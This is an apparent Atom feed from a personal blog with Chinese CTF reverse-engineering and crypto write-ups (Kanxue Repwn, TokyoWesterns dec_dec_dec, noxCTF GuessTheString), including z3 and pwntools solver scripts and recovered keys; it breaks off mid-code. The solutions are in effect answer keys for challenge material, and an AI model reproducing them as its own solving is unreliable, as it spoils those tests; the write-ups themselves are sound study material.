<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>l1b0&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://l1b0.fun/"/>
  <updated>2019-09-17T12:35:14.804Z</updated>
  <id>https://l1b0.fun/</id>
  
  <author>
    <name>l1b0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019看雪CTF-Q1-第六题 Repwn详解</title>
    <link href="https://l1b0.fun/2019/03/26/2019%E7%9C%8B%E9%9B%AACTF-Q1-%E7%AC%AC%E5%85%AD%E9%A2%98-Repwn%E8%AF%A6%E8%A7%A3/"/>
    <id>https://l1b0.fun/2019/03/26/2019看雪CTF-Q1-第六题-Repwn详解/</id>
    <published>2019-03-26T12:34:08.000Z</published>
    <updated>2019-09-17T12:35:14.804Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这题花了我今天所有的空闲时间（大概五个多小时），所以有必要记录一下自己的解题过程:-)</p><p><a href="https://github.com/L1B0/CTF/tree/master/2019%E7%9C%8B%E9%9B%AACTF-Q1/Repwn" target="_blank" rel="noopener">题目和脚本</a></p></blockquote><h2 id="0x01-第一关（re-pwn-）"><a href="#0x01-第一关（re-pwn-）" class="headerlink" title="0x01 第一关（re+pwn???）"></a>0x01 第一关（re+pwn???）</h2><p>第一个关键函数sub_4014C0伪代码如下</p><p><img src="https://s2.ax1x.com/2019/03/14/AATodg.md.png" alt="1"></p><a id="more"></a><p>首先输入key，进入第一个校验函数sub_4012F0，如下图</p><p><img src="https://s2.ax1x.com/2019/03/14/AATjyV.png" alt="2"></p><p>可以看到是进行明文比较a1[8:20]是否等于<code>X1Y0uN3tG00d</code>，这里的a1即输入的key；并且校验a1[20]是否等于<code>H</code> 。</p><p>接下来进入函数sub_401460，如下图。</p><p><img src="https://s2.ax1x.com/2019/03/14/AAXBp4.png" alt="img"></p><p>该函数给出了key的长度为24，然后通过函数sub_4013B0校验key的前8个字节，前8个字节的校验比较简单，用z3跑一发即可，这里不再赘述。</p><blockquote><p><a href="https://github.com/L1B0/CTF/blob/master/2019%E7%9C%8B%E9%9B%AACTF-Q1/Repwn/exp_z3.py" target="_blank" rel="noopener">z3脚本地址</a></p><p>（比较坑的是题目并没有说key的前八位只能是数字，错了好多次直到问了出题人才知道这题居然还有”标准“答案。。。）</p></blockquote><p>综上我们得到<code>key[0:21] = &quot;20101001X1Y0uN3tG00dH&quot;</code>。</p><p>接着非常奇怪的是key 的最后四个字节仅进行了减操作，然后对key进行了复制，至此key 的校验结束。</p><p>于是用Olldbg动态调试一下，在输入处下断点，F9执行至返回（停在断点），直到运行至0x40149C，如下图。</p><p><img src="https://s2.ax1x.com/2019/03/14/AAXsXR.png" alt="img"></p><p>往后运行一下发现这里还有个jmp指令，继续跟，发现程序崩了，并且错误提示如下。</p><p><img src="https://s2.ax1x.com/2019/03/14/AAXojA.png" alt="img"></p><p>我的输入是<code>20101001X1Y0uN3tG00dH123</code>，而<code>H123</code>的十六进制为<code>0x48313233</code>，各个字节经过函数sub_401460里的减操作之后得到的就是<code>0xF0EB2FC8</code>。也就是说我输入的最后四个字节经过减操作之后被当成地址进行跳转。</p><p>问题是应该跳到哪里去呢？可以确定的是这个地址的最后两位一定是<code>F0</code>，并且地址的前四位一定是<code>0040</code>，以此可以知道<code>key[22:23] = &quot;Ck&quot;</code>，那么就差key[21]了。</p><p>然后我就去IDA疯狂翻地址末尾为F0的函数，然后啥都没翻到。</p><p>最后无意中看到0x00401BF0处的汇编十分可疑，但是此处并没有识别为函数。IDA里右键选择<code>create function</code> 即可。</p><p>而<code>chr(0x46+0x1b) = &#39;a&#39;</code> ，即key就是<code>20101001X1Y0uN3tG00dHaCk</code>。</p><h2 id="0x02-第二关（re）"><a href="#0x02-第二关（re）" class="headerlink" title="0x02 第二关（re）"></a>0x02 第二关（re）</h2><p><img src="https://s2.ax1x.com/2019/03/14/AAXLAf.md.png" alt="img"></p><p>这个加密算法我看了一两个小时。。。</p><p>最后通过一些特征数据查到这是DES加密。。。</p><p>需要注意的是，这里的一大堆赋值跟v12并没有半毛钱关系。。v12的值在0x0040740C处。</p><p><img src="https://s2.ax1x.com/2019/03/14/AAXbHP.png" alt="img"></p><p>Dst是通过密文（64位）每4位一组得到的16个十进制数，这里我一开始看岔了。。绕了好久。</p><p>综上，DES加密，密钥为<code>XiyouNet</code>，密文为<code>0x9db084ac97041e30</code>，python解一发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from Crypto.Cipher import DES</span><br><span class="line">&gt;&gt;&gt; key = &apos;XiyouNet&apos;</span><br><span class="line">&gt;&gt;&gt; des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">&gt;&gt;&gt; des.decrypt(&quot;\x9d\xb0\x84\xac\x97\x04\x1e0&quot;)</span><br><span class="line">&apos;Wel1C0me&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这题花了我今天所有的空闲时间（大概五个多小时），所以有必要记录一下自己的解题过程:-)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/L1B0/CTF/tree/master/2019%E7%9C%8B%E9%9B%AACTF-Q1/Repwn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目和脚本&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x01-第一关（re-pwn-）&quot;&gt;&lt;a href=&quot;#0x01-第一关（re-pwn-）&quot; class=&quot;headerlink&quot; title=&quot;0x01 第一关（re+pwn???）&quot;&gt;&lt;/a&gt;0x01 第一关（re+pwn???）&lt;/h2&gt;&lt;p&gt;第一个关键函数sub_4014C0伪代码如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/03/14/AATodg.md.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
      <category term="DES" scheme="https://l1b0.fun/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>TokyoWesterns_CTF_2018-re_dec_dec_dec-wp</title>
    <link href="https://l1b0.fun/2018/09/08/TokyoWesterns-CTF-2018-re-dec-dec-dec-wp/"/>
    <id>https://l1b0.fun/2018/09/08/TokyoWesterns-CTF-2018-re-dec-dec-dec-wp/</id>
    <published>2018-09-08T12:32:35.000Z</published>
    <updated>2019-09-17T12:33:34.594Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近在搞小学期的项目，没空写wp，这题是上周搞出来的，这里简单记录一下，可能有些细节忘了。。。</p><p>==&gt;<a href="https://github.com/L1B0/CTF/tree/master/TokyoWesterns%20CTF_4th_2018/re_dec_dec_dec" target="_blank" rel="noopener">题目地址</a>&lt;==</p></blockquote><h2 id="0x00-简单分析"><a href="#0x00-简单分析" class="headerlink" title="0x00 简单分析"></a>0x00 简单分析</h2><p>程序是64位ELF，先拖进IDA看下逻辑。</p><a id="more"></a><p><code>main</code>函数代码如下</p><p><img src="https://s1.ax1x.com/2018/09/08/iP4i7t.md.png" alt="img"></p><p>可以看到<code>a2[1]</code>实际上就是<code>argv[1]</code>，在程序中也就是我们输入的flag。将``a2[1]<code>复制给</code>dest<code>后，经过三轮加密，与</code>s2`进行明文比较。那么接下来分析三轮加密具体做了什么。</p><h2 id="0x01-函数sub-860"><a href="#0x01-函数sub-860" class="headerlink" title="0x01 函数sub_860"></a>0x01 函数sub_860</h2><p>看代码发现在开头有一串字符<code>ABCDEFG......</code>，并且是每三个字符变换成四个字符，猜测是<strong>base64</strong>。</p><p>用IDA动态调试验证一下(<a href="https://l1b0.github.io/2018/08/13/TJCTF-2018-bin-Writeup/" target="_blank" rel="noopener">关于如何用IDA动态调试ELF</a>)。</p><p>如下图，在函数<code>sub_860</code>执行之后，v6即第一轮加密的结果，并且其存在寄存器rax里。</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fv2c43ksuqj317m0fkq6j.jpg" alt="img"></p><p>查看rax的值如下</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fv2c68jothj30l5076myf.jpg" alt="img"></p><p>我输入的flag为123456789，其base64加密结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&quot;123456789&quot;)</span><br><span class="line">&apos;MTIzNDU2Nzg5&apos;</span><br></pre></td></tr></table></figure><p>可以看到与程序第一轮加密结果相同，于是函数sub_860即base64加密。</p><h2 id="0x02-函数sub-F59"><a href="#0x02-函数sub-F59" class="headerlink" title="0x02 函数sub_F59"></a>0x02 函数sub_F59</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>同样，继续调试，可以看到第二轮加密结果赋给了v7，而v7的内容存在了寄存器rax里，查看rax值如下。</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fv2ccnp6d6j30l807igmv.jpg" alt="img"></p><p>经验丰富的赛棍(比如说我m4x师傅)会直接看出这是<strong>rot13</strong>加密。</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>但我没看出来233，我的解决办法是看这个函数的伪代码，发现只是一个简单的替换加密，那么直接逐位爆破即可。</p><h2 id="0x03-函数sub-BE7"><a href="#0x03-函数sub-BE7" class="headerlink" title="0x03 函数sub_BE7"></a>0x03 函数sub_BE7</h2><p>这个函数是题目里最复杂的加密，接下来逐行分析。</p><p>首先分析如下代码，v1表示上一轮加密结果的长度，其实从<code>v34 = malloc(4 * v1 / 3 + 1)</code>就可以猜出这轮加密也是明文每三个字符变换得到密文的四个加密字符，但还<strong>多了一个字节</strong>，这个字节非常<strong>关键</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">38 ：v1 = strlen(a1);</span><br><span class="line">39：v34 = malloc(4 * v1 / 3 + 1);</span><br></pre></td></tr></table></figure><p>接着往下会看到<code>for ( i = v1; i &gt; 45; i -= 45 )</code>，如果v1小于45不执行这个循环，由于我们不知道v1应该是多少，于是跳过这个循环往下看。</p><p>如下图，如果没执行上面的循环，<code>v26</code>即<code>v34</code>即密文的第一位，<code>i</code>即<code>v1</code> ，下面代码的含义就是将v1经过一个算式得到一个新的值放在密文的第一位，也就是说密文的第一位表示了v1（第二轮加密的密文）的长度。</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fv2cp94de0j30c205rweo.jpg" alt="img"></p><p>从最后<code>strcmp</code>可以跟踪到密文的内容为<code>@25-Q44E233=,&gt;E-M34=,,$LS5VEQ45)M2S-),7-$/3T</code>，第一位为<code>@</code>，值为64，逆推可以得到第二轮的密文长度为32。</p><p>知道了长度之后用z3即可爆破出第二轮的密文，然后就爆破第二轮的算法再解base64即可。</p><h2 id="0x04-脚本"><a href="#0x04-脚本" class="headerlink" title="0x04 脚本"></a>0x04 脚本</h2><blockquote><p>由于第二轮密文的长度为32，不是3的倍数，在最后一次三个字符加密成四个字符时密文的第四个字符由于找不到明文的第三个字符，默认为32，即空格，，这也是为什么密文的最后一位是空格，并且爆破时最后一次无结果。根据flag格式就直接猜出是’}‘，不用过于纠结。</p></blockquote><p>第三轮的爆破我分别用z3和直接三重循环跑了一下，发现用z3只需0.3s，暴力循环要1.36s。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">import base64</span><br><span class="line">from string import printable</span><br><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">cipher = &quot;25-Q44E233=,&gt;E-M34=,,$LS5VEQ45)M2S-),7-$/3T \x00&quot;</span><br><span class="line">print len(cipher)</span><br><span class="line"></span><br><span class="line">def decode_level1(s):</span><br><span class="line">    if len(s)%4 != 0:</span><br><span class="line">        return base64.b64decode(s[:len(s)-len(s)%4])</span><br><span class="line"></span><br><span class="line">def decode_level2(s):</span><br><span class="line"></span><br><span class="line">    s1 = &apos;&apos;</span><br><span class="line">    for i in s:</span><br><span class="line">        j = ord(i)</span><br><span class="line">        for k in range(256):</span><br><span class="line">            l = 0</span><br><span class="line">            if (k &lt;= 0x40 or k &gt; 0x5a):</span><br><span class="line">                if (k &lt;= 0x60 or k &gt; 0x7a):</span><br><span class="line">                    l = k</span><br><span class="line">                else:</span><br><span class="line">                    l = (k-0x54)%26 + 0x61 </span><br><span class="line">            else:</span><br><span class="line">                l = (k-0x34)%26 + 0x41 </span><br><span class="line">            if l == j:</span><br><span class="line">                s1 += chr(k)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">#print len(s),len(s1)</span><br><span class="line">    return s1 </span><br><span class="line"></span><br><span class="line">def decode_level3(cipher):</span><br><span class="line">    </span><br><span class="line">    ss = &quot;&quot;</span><br><span class="line">    </span><br><span class="line">    for i in range(11):</span><br><span class="line">        </span><br><span class="line">        s = Solver()</span><br><span class="line">        a1,a2,a3 = [ BitVec(&apos;a&apos;+str(j),16) for j in range(1,4) ]</span><br><span class="line">        for j in range(1,4):</span><br><span class="line">            s.add( And( eval(&apos;a&apos;+str(j)) &gt; 0, eval(&apos;a&apos;+str(j)) &lt; 256 ) )</span><br><span class="line"></span><br><span class="line">        s.add( (a1&gt;&gt;2) + 32 == ord(cipher[4*i]) )</span><br><span class="line">        s.add( (( ((16*a1)&amp;0x30) + 32 ) | (a2 &gt;&gt; 4)) == ord(cipher[4*i+1]) )</span><br><span class="line">        s.add( ((((4*a2)&amp;0x3c) +32) | (a3 &gt;&gt; 6) ) == ord(cipher[4*i+2]) )</span><br><span class="line">        s.add( (a3&amp;0x3f) +32 == ord(cipher[4*i+3]) )</span><br><span class="line">        </span><br><span class="line">#print s.check()</span><br><span class="line">        if s.check() == sat:</span><br><span class="line"></span><br><span class="line">#print s.model()</span><br><span class="line">            </span><br><span class="line">            ss += chr(s.model()[a1].as_long())</span><br><span class="line">            ss += chr(s.model()[a2].as_long())</span><br><span class="line">            ss += chr(s.model()[a3].as_long())</span><br><span class="line">#print ss</span><br><span class="line"></span><br><span class="line">#print ss </span><br><span class="line">    return ss </span><br><span class="line"></span><br><span class="line">def decode_level30(cipher):</span><br><span class="line"></span><br><span class="line">    ss = &quot;&quot;</span><br><span class="line">    for i in range(11):</span><br><span class="line">        flag = 0</span><br><span class="line">        for a1 in printable:</span><br><span class="line">            for b1 in printable:</span><br><span class="line">                for c1 in printable:</span><br><span class="line">                    a,b,c = ord(a1),ord(b1),ord(c1)</span><br><span class="line">                    if (a&gt;&gt;2) + 32 == ord(cipher[4*i]) and (( ((16*a)&amp;0x30) + 32 ) | (b &gt;&gt; 4)) == ord(cipher[4*i+1]) and ((((4*b)&amp;0x3c) +32) | (c &gt;&gt; 6) ) == ord(cipher[4*i+2]) and (c&amp;0x3f) +32 == ord(cipher[4*i+3]):</span><br><span class="line">                        ss += chr(a)+chr(b)+chr(c)</span><br><span class="line">                        flag = 1</span><br><span class="line">                        break</span><br><span class="line">                if flag:</span><br><span class="line">                  break</span><br><span class="line">            if flag:</span><br><span class="line">                break</span><br><span class="line">    </span><br><span class="line">    print ss</span><br><span class="line">    return ss</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    flag2 = decode_level30(cipher)</span><br><span class="line">#flag2 = decode_level30(cipher)</span><br><span class="line">    flag1 = decode_level2(flag2)</span><br><span class="line">    print flag1</span><br><span class="line">    flag = decode_level1(flag1)</span><br><span class="line"></span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;最近在搞小学期的项目，没空写wp，这题是上周搞出来的，这里简单记录一下，可能有些细节忘了。。。&lt;/p&gt;
&lt;p&gt;==&amp;gt;&lt;a href=&quot;https://github.com/L1B0/CTF/tree/master/TokyoWesterns%20CTF_4th_2018/re_dec_dec_dec&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目地址&lt;/a&gt;&amp;lt;==&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-简单分析&quot;&gt;&lt;a href=&quot;#0x00-简单分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 简单分析&quot;&gt;&lt;/a&gt;0x00 简单分析&lt;/h2&gt;&lt;p&gt;程序是64位ELF，先拖进IDA看下逻辑。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>noxCTF_2018-re_GuessTheString-wp</title>
    <link href="https://l1b0.fun/2018/09/08/noxCTF-2018-re-GuessTheString-wp/"/>
    <id>https://l1b0.fun/2018/09/08/noxCTF-2018-re-GuessTheString-wp/</id>
    <published>2018-09-08T12:31:20.000Z</published>
    <updated>2019-09-17T12:32:15.268Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>==&gt;<a href="https://github.com/L1B0/CTF/tree/master/noxCTF_2018" target="_blank" rel="noopener">题目地址</a>&lt;==</p></blockquote><h2 id="0x00-简单分析"><a href="#0x00-简单分析" class="headerlink" title="0x00 简单分析"></a>0x00 简单分析</h2><p>一道简单re，但是很坑啊。</p><p>用IDA直接看代码，逻辑如下。</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fv2dpw6bmjj311p0eun0j.jpg" alt="img"></p><a id="more"></a><h2 id="0x01填坑"><a href="#0x01填坑" class="headerlink" title="0x01填坑"></a>0x01填坑</h2><p>a1的前三位可以直接通过两个等式爆破出可能的结果。</p><p>第四位的check函数如下</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fv2dsri9okj30vt0afmxr.jpg" alt="img"></p><p>乍一看需要<code>a1[3] &gt; a1[2]</code>且<code>a1[2]*a1[2] == a1[3]*a1[3]</code>，这不扯淡吗。。。后来仔细想想a1[2]和a1[3]都是byte类型，所以实际上只需<code>(a1[2]*a1[2])%256 == (a1[3]*a1[3])%256</code>即可。</p><p>然后第5,6,7位可以直接爆破出确定结果。</p><p>第8位的可能结果有<code>[48,52,56]</code>。</p><p>第9位有一个未知数，我的想法是先通过前面所有函数的check，动态调试看这个未知数的值，发现是12，于是第9位可以通过第8位算出，第10位可以通过第9位算出。</p><p>第10位我一开始拿flag的时候没搞懂HIBYTE怎么用，是直接爆破的，因为前面的10位都差不多确定了，爆破就行。</p><h2 id="0x02-解题脚本"><a href="#0x02-解题脚本" class="headerlink" title="0x02 解题脚本"></a>0x02 解题脚本</h2><p>写wp的时候还是用gdb调了一下，发现HIBYTE对于一个16bit的数取得是高8位。。这样就懂了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">a0 = [</span><br><span class="line">&apos;%^Jv&apos;,</span><br><span class="line">&apos;/JTl&apos;,</span><br><span class="line">&apos;/JTt&apos;,</span><br><span class="line">&apos;J/Tl&apos;,</span><br><span class="line">&apos;J/Tt&apos;,</span><br><span class="line">&apos;^%Jv&apos;</span><br><span class="line">]</span><br><span class="line">a4 = [</span><br><span class="line">&apos;C=&amp;&apos;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def is_Prime(n):</span><br><span class="line">    if n &lt;= 2:</span><br><span class="line">        return 1</span><br><span class="line">    for i in range(2,n):</span><br><span class="line">        if n%i == 0:</span><br><span class="line">            return 0</span><br><span class="line">    return 1</span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">def get_0123():</span><br><span class="line"></span><br><span class="line">    for i in range(33,127):</span><br><span class="line">        for j in range(33,127):</span><br><span class="line">            for k in range(33,127):</span><br><span class="line">                if not(i*j == 3478 and (j^i)^k == 49):</span><br><span class="line">                    continue</span><br><span class="line">                else:</span><br><span class="line">                    for l in range(k+1,127):</span><br><span class="line">                        if (l**2)%256 == (k**2)%256:</span><br><span class="line">                            s = chr(i)+chr(j)+chr(k)+chr(l)</span><br><span class="line">                            print s</span><br><span class="line"></span><br><span class="line">def get_456():</span><br><span class="line">    for i in range(33,127):</span><br><span class="line">        for j in range(33,127):</span><br><span class="line">            if (j-42) &gt; 0 and is_Prime(i) and is_Prime(j) and is_Prime(j-42) and i^j == 126:</span><br><span class="line">                s = chr(i)+chr(j)+chr(2*(j-42))</span><br><span class="line">                print s</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">#get_0123()</span><br><span class="line">#get_456()</span><br><span class="line">    for i in a0:</span><br><span class="line">        for j in a4:</span><br><span class="line">            for k in [48,52,56]:</span><br><span class="line">                a7 = k</span><br><span class="line">                #*(_BYTE *)(a3 + 8) == (a1 ^ *(_BYTE *)(a3 + 7)); a1 = 0x12 by debug</span><br><span class="line">                a8 = a7^0x12 </span><br><span class="line">                a9 = 2*a8</span><br><span class="line">                a100 =  (a9+1)*(a9)/2 </span><br><span class="line">                #burte a10</span><br><span class="line">                for l in range(33,127):</span><br><span class="line">                    s = i+j+chr(a7)+chr(a8)+chr(a9)+chr(l)</span><br><span class="line">                    print s</span><br><span class="line">                </span><br><span class="line">                    io = process(&apos;./GuessTheString&apos;)</span><br><span class="line">                    io.recvline()</span><br><span class="line">                    io.sendline(s)</span><br><span class="line">                    io.recvline()</span><br><span class="line">                    io.close()</span><br></pre></td></tr></table></figure><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><ul><li>对LOWORD, HIWORD, LOBYTE, HIBYTE的理解： <a href="https://blog.csdn.net/huang_xw/article/details/8738610" target="_blank" rel="noopener">https://blog.csdn.net/huang_xw/article/details/8738610</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;==&amp;gt;&lt;a href=&quot;https://github.com/L1B0/CTF/tree/master/noxCTF_2018&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题目地址&lt;/a&gt;&amp;lt;==&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-简单分析&quot;&gt;&lt;a href=&quot;#0x00-简单分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 简单分析&quot;&gt;&lt;/a&gt;0x00 简单分析&lt;/h2&gt;&lt;p&gt;一道简单re，但是很坑啊。&lt;/p&gt;
&lt;p&gt;用IDA直接看代码，逻辑如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://wx4.sinaimg.cn/mw690/0060lm7Tly1fv2dpw6bmjj311p0eun0j.jpg&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Reverse" scheme="https://l1b0.fun/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>hackme-inndy-crypto-mutilayer</title>
    <link href="https://l1b0.fun/2018/08/19/hackme-inndy-crypto-mutilayer/"/>
    <id>https://l1b0.fun/2018/08/19/hackme-inndy-crypto-mutilayer/</id>
    <published>2018-08-19T12:29:49.000Z</published>
    <updated>2019-09-17T12:30:54.636Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Points: 150</p><p>Solves: 6</p></blockquote><p>一道多重加密的crypto，很好玩。</p><a id="more"></a><h3 id="题目源码如下"><a href="#题目源码如下" class="headerlink" title="题目源码如下"></a>题目源码如下</h3><p>为了能在本地跑起来我做了一点改动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import 